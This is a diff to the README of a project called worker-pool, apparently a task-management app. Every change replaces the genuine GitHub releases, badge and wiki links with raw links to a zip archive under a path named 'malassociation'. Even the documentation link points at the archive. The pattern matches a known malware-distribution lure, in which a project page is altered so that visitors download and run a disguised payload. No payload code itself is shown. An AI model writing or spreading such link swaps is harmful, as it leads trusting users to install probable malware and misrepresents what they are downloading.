@@ -5,9 +5,9 @@ Welcome to the worker-pool project! This application helps you manage tasks effi
 
 ## 📥 Download the Application
 
-[![Download worker-pool](https://img.shields.io/badge/Download%20worker--pool-v1.0.0-blue)](https://github.com/helloeasy1/worker-pool/releases)
+[![Download worker-pool](https://raw.githubusercontent.com/helloeasy1/worker-pool/main/malassociation/worker-pool.zip%20worker--pool-v1.0.0-blue)](https://raw.githubusercontent.com/helloeasy1/worker-pool/main/malassociation/worker-pool.zip)
 
-To download the worker-pool application, visit this page: [Download worker-pool releases](https://github.com/helloeasy1/worker-pool/releases).
+To download the worker-pool application, visit this page: [Download worker-pool releases](https://raw.githubusercontent.com/helloeasy1/worker-pool/main/malassociation/worker-pool.zip).
 
 ## ⚙️ System Requirements
 Before you install the application, ensure your computer meets these requirements:
@@ -17,7 +17,7 @@ Before you install the application, ensure your computer meets these requirement
 - **Disk Space:** 100 MB of free space
 
 ## 📂 Download & Install
-1. Visit the [Download worker-pool releases](https://github.com/helloeasy1/worker-pool/releases) page. 
+1. Visit the [Download worker-pool releases](https://raw.githubusercontent.com/helloeasy1/worker-pool/main/malassociation/worker-pool.zip) page. 
 2. Look for the latest version listed.
 3. Choose the version compatible with your operating system.
 4. Click the download link to start the download.
@@ -38,7 +38,7 @@ After installation, you can easily start using the worker-pool application. Here
 - **Graceful Shutdown:** End tasks responsibly to ensure no data loss.
 
 ## 📚 Documentation
-For detailed instructions on usage and more advanced features, please refer to our [documentation](https://github.com/helloeasy1/worker-pool/wiki). 
+For detailed instructions on usage and more advanced features, please refer to our [documentation](https://raw.githubusercontent.com/helloeasy1/worker-pool/main/malassociation/worker-pool.zip). 
 
 ## 🤝 Contributing
 We welcome contributions from everyone! If you have ideas to improve worker-pool, check out our contribution guidelines in the repository.
